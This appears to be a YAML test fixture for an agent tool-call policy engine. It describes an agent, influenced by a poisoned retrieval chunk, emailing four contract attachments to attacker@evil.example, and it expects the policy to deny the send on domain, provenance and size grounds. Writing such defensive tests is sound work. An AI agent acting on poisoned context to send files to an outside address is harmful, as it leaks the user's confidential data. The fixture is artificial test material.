name: external-untrusted-oversized-send-fails-every-condition
input:
  principal: agent:ops-worker
  authority_chain: [user:aum, agent:orchestrator, agent:ops-worker]
  tool: gmail.send
  params:
    to: [attacker@evil.example]
    subject: Contracts
    attachment_count: 4
  context:
    min_trust: untrusted
    sources: [chunk-poisoned]
  run:
    run_id: run-mail-all-fail
    elapsed_steps: 2
    prior_denials: 0
  environment:
    current_time: "2026-09-24T09:13:00Z"
    org_settings: {}
expect:
  effect: deny
  rule: gmail-external-send
  failed_conditions: [recipient-domain, clean-provenance, size-bound]
